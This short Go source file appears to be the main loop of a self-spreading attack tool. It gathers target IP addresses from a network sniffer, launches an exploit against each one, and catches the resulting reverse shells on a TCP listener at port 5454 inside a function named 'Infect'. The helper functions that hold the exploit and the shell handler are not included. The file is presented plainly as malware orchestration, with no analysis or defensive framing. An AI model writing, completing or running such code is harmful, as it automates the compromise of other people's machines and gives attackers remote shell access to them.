package main

import (
  //"fmt"
  //"time"
  //"bufio"
  //"os"
  "net"
)

func Infect(ip string, listener net.Listener, exploit_request_channel chan string){
  exploit_request_channel <- ip
  ListenAndHandleTCPShell(listener, ip, exploit_request_channel)
}

func main(){
  listener, _ := net.Listen("tcp4", ":5454")
  ip_passing_channel := make(chan string)
  exploit_request_channel := make(chan string)

  go func(){
    for ip := range exploit_request_channel {
      LaunchExploit(ip)
    }
  }()

  go ListenForSnifferData(ip_passing_channel)

  for ip := range ip_passing_channel {
    Infect(ip, listener, exploit_request_channel)
  }
}
